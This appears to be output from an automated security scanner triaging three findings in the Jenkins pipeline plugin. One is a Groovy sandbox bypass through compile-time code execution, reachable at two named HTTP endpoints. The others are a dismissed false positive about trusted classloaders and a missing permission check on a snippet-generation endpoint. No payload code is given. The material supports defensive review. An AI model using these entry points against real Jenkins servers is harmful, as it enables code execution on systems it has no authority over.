ReplayAction.doCheckScriptCompile directly delegates to `CpsFlowDefinition.DescriptorImpl.doCheckScriptCompile(job, value)`, which has the sandbox bypass vulnerability (calling `getClassLoader().parseClass(value)` without a sandbox scope). 

This means the sandbox bypass is accessible via TWO HTTP endpoints:
1. `/job/JOBNAME/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile` 
2. `/job/JOBNAME/BUILD_NUM/replay/checkScriptCompile`

The permission check in the delegated method requires `Job.CONFIGURE`, which is the same permission needed for REPLAY access. This doubles the attack surface for the core sandbox bypass vulnerability.

evidence.code_context:
ReplayAction.doCheckScriptCompile delegates to:
  Jenkins.get().getDescriptorByType(CpsFlowDefinition.DescriptorImpl.class).doCheckScriptCompile(job, value)

The delegated method contains the sandbox bypass:
  new CpsGroovyShellFactory(null).withParent(trusted).withSandbox(true).build().getClassLoader().parseClass(value);

This means the same vulnerability is exposed via the ReplayAction URL as well.
evidence.dataflow_analysis: HTTP @QueryParameter value -> ReplayAction.doCheckScriptCompile -> CpsFlowDefinition.DescriptorImpl.doCheckScriptCompile -> getClassLoader().parseClass(value) [no sandbox scope]
evidence.notes: This is a second entry point to the same core vulnerability identified in CpsFlowDefinition.java:136. Both endpoints are accessible to users with Job.CONFIGURE permission.

exploit_payload.scenario: User with Job.CONFIGURE permission posts crafted Groovy script to ReplayAction.doCheckScriptCompile endpoint, triggering compile-time code execution via AST transforms without sandbox restrictions
exploit_payload.prerequisites: Job.CONFIGURE permission (same as REPLAY permission default)
exploit_payload.category: Groovy sandbox bypass via compile-time code execution

flags.message: This is a secondary entry point to a known sandbox bypass vulnerability, not independently documented
flags.evidence: The finding correctly identifies that ReplayAction.doCheckScriptCompile delegates to CpsFlowDefinition.DescriptorImpl.doCheckScriptCompile, creating a second HTTP endpoint for the same underlying vulnerability

flags.message: Exploitability depends on permission model and whether the delegated method actually performs unsafe operations
flags.evidence: The code snippet shows delegation to CpsFlowDefinition.DescriptorImpl.doCheckScriptCompile, but the actual sandbox bypass is in the delegated method. The ReplayAction.REPLAY permission (extending Item.CONFIGURE) controls access. Whether this is a meaningful additional attack surface depends on whether the two endpoints have different permission requirements.

sanity_check.reasoning: The code snippet accurately shows the delegation pattern described in the finding. The vulnerability itself is real if the delegated CpsFlowDefinition.DescriptorImpl.doCheckScriptCompile contains a sandbox bypass via parseClass() without sandbox scope - the finding's evidence supports this. However, this is essentially a duplicate entry point to the same core vulnerability rather than a distinct new vulnerability, and the severity depends on whether this endpoint has weaker access controls than the primary one. Manual review is warranted to confirm the permission differences between the two endpoints and whether the delegated method has been patched.

findings.description: CpsFlowExecution.parseScript uses forTrusted() to create an unsandboxed trusted shell - this is intentional design for the trusted library class loader
findings.reasoning:
In `CpsFlowExecution.parseScript()`, the `trusted` shell is created with `forTrusted()` (sandbox=false) as the parent class loader for the main `shell`. This is the intentional architecture:
- `trusted` shell: for loading trusted library scripts (shared libraries that are pre-approved)
- `shell`: for loading user pipeline scripts, using the trusted shell as parent class loader

This is the designed classloader hierarchy documented in `doc/classloader.md`. The trusted shell is used as a parent class loader so that classes defined in trusted libraries are accessible to user scripts. The actual pipeline script execution goes through `shell.reparse()` → `doParse()` → `GroovySandbox.Scope` for sandboxed executions.

For non-sandboxed executions, script approval is handled separately via `ScriptApproval.get().using()` in `CpsFlowDefinition.create()`. This is not a vulnerability - it is the intended trust model.

This is a false positive - the `forTrusted()` call here is the correct and intentional design for the trusted classloader hierarchy.

evidence.code_context:
CpsFlowExecution.parseScript():
  trusted = new CpsGroovyShellFactory(this).forTrusted().build(); // parent classloader for trusted libs
  shell = new CpsGroovyShellFactory(this).withParent(trusted).build(); // user script shell
  CpsScript s = (CpsScript) shell.reparse('WorkflowScript', script); // goes through doParse() -> sandbox scope

CpsGroovyShellFactory constructor:
  this.sandbox = execution!=null && execution.isSandbox(); // sandbox state from execution

The trusted shell serves as parent classloader only - user scripts are parsed by 'shell' which enforces sandbox.
For non-sandboxed: ScriptApproval.get().using(script) is called in CpsFlowDefinition.create().
evidence.dataflow_analysis: parseScript() -> shell.reparse('WorkflowScript', script) -> doParse() -> GroovySandbox.Scope (if sandboxed) -> super.parse()
evidence.notes: This is intentional trusted classloader architecture. The forTrusted() call creates the parent classloader for trusted shared libraries, not for executing user scripts directly.

flags.message: The forTrusted() call is intentional architectural design, not a vulnerability
flags.evidence: Code comment explicitly states 'classloader hierarchy. See doc/classloader.md' - this is documented design. The trusted shell serves as parent classloader for shared libraries, not for executing arbitrary user scripts.

flags.message: User scripts are executed through the sandboxed 'shell', not the trusted shell directly
flags.evidence: shell.reparse('WorkflowScript', script) uses the shell (not trusted), which enforces sandbox via CpsGroovyShellFactory's sandbox state derived from execution.isSandbox(). The trusted shell is only a parent classloader for pre-approved shared libraries.

sanity_check.reasoning: This is intentional Jenkins pipeline architecture where a trusted classloader hierarchy is established for shared library support. The 'trusted' shell serves as a parent classloader for pre-approved shared libraries, while user pipeline scripts are parsed through the sandboxed 'shell'. This design is explicitly documented in the codebase (doc/classloader.md) and is not a code injection vulnerability - it's the mechanism by which Jenkins properly isolates trusted library code from user-submitted pipeline scripts.

findings.description: Unauthenticated HTTP endpoint doGenerateSnippet allows user-controlled class loading and object instantiation via uberClassLoader without permission checks
findings.reasoning:
The `doGenerateSnippet` HTTP endpoint at `/pipeline-syntax/generateSnippet` accepts a user-controlled `json` query parameter and:

1. **No permission check**: There is no `@RequirePOST`, no `checkPermission()`, no `hasPermission()` call in the method itself. While `PerJobAdder` gates access to `LocalAction` using `Item.EXTENDED_READ`, the root-level `Snippetizer` extension accessible at the global `/pipeline-syntax/generateSnippet` URL has no such gating at the HTTP handler level.

2. **User-controlled class loading**: The `json` parameter flows directly to `jsonO.getString("stapler-class")` which is then passed to `j.getPluginManager().uberClassLoader.loadClass(...)`. This allows an attacker to probe any class on the Jenkins classpath by name.

3. **User-controlled object instantiation**: The `descriptor.newInstance(req, jsonO)` call instantiates arbitrary `Describable` plugin classes using user-controlled JSON. This could trigger malicious behavior in plugin descriptors or expose sensitive information through error messages.

4. **Not directly OS command injection**: The generated Groovy snippet is returned as text and not executed server-side, so this is not a direct CWE-078 vulnerability. However, the class loading and instantiation path could potentially chain into OS command execution if an exploitable plugin descriptor exists.

The `@Restricted(DoNotUse.class)` annotation is a developer-facing code restriction only and does NOT enforce HTTP access control.

This requires manual review to determine:
- Whether Jenkins global security (require authentication) gates this endpoint
- Whether any existing plugin descriptor's `newInstance()` can trigger OS command execution with attacker-controlled parameters

evidence.code_context: Line 486-533: doGenerateSnippet takes @QueryParameter String json, parses it as JSONObject, extracts 'stapler-class' field, loads it via uberClassLoader.loadClass(), then calls descriptor.newInstance(req, jsonO). No permission check exists in the method.
evidence.dataflow_analysis: Confirmed dataflow: json (line 487, col 63-90) → JSONObject.fromObject(json) (line 489) → jsonO.getString('stapler-class') (line 491, col 69-101) → uberClassLoader.loadClass(). Three independent dataflow paths confirmed by trace_dataflow_path tool.
evidence.access_control: No @RequirePOST, no checkPermission(), no hasPermission() in doGenerateSnippet. PerJobAdder uses Item.EXTENDED_READ to conditionally add LocalAction to Jobs, but the global Snippetizer RootAction at /pipeline-syntax/generateSnippet is only gated by Jenkins' global 'read' permission (anonymous access if Jenkins security not configured).
evidence.notes: The @Restricted(DoNotUse.class) annotation is a compile-time/IDE warning only, enforced by bytecode analysis tools like Error Prone - it does NOT restrict HTTP access. The GENERATE_URL constant 'pipeline-syntax/generateSnippet' confirms this is an accessible URL.

message.text:
Dataflow path from source to sink
Dataflow path from source to sink
Dataflow path from source to sink

flags.message: Missing permission check on HTTP endpoint enabling class loading and object instantiation, but exploitability depends on Jenkins global security configuration
flags.evidence: The method doGenerateSnippet lacks @RequirePOST and checkPermission() calls. However, Jenkins typically requires at least Overall/Read permission for any web access when security is enabled. The actual risk is elevated when Jenkins is configured with anonymous read access or when an authenticated user with read-only permissions can trigger arbitrary descriptor instantiation.

flags.message: The vulnerability combines missing permission checks with user-controlled class loading and object instantiation - a potential SSRF/RCE vector depending on available Descriptors
flags.evidence: The code loads arbitrary classes via uberClassLoader.loadClass() based on user-supplied 'stapler-class' JSON parameter, then calls descriptor.newInstance() with user-controlled JSON data. While constrained to registered Descriptors (j.getDescriptor()), this could trigger side effects in constructors or newInstance implementations of various Jenkins plugins.

flags.message: CWE-078 (OS Command Injection) classification is questionable - the vulnerability is more accurately CWE-284 (Improper Access Control) combined with CWE-470 (Use of Externally-Controlled Input to Select Classes or Code)
flags.evidence: The code doesn't directly execute OS commands. The risk is unauthorized object instantiation via descriptor pattern which could have side effects, but direct command injection is not demonstrated in the snippet.

sanity_check.reasoning: The code does exhibit a real security concern: a publicly accessible HTTP endpoint that loads classes and instantiates objects based on user-supplied JSON without explicit permission checks. The CWE-078 classification is inaccurate (this is more of an access control/unsafe reflection issue), but the underlying vulnerability pattern is legitimate. The actual exploitability depends heavily on Jenkins security realm configuration and what Descriptor implementations are available. This warrants manual review to determine if Jenkins' baseline security mechanisms (Overall/Read permission requirement) adequately mitigate the risk or if additional permission checks are needed.
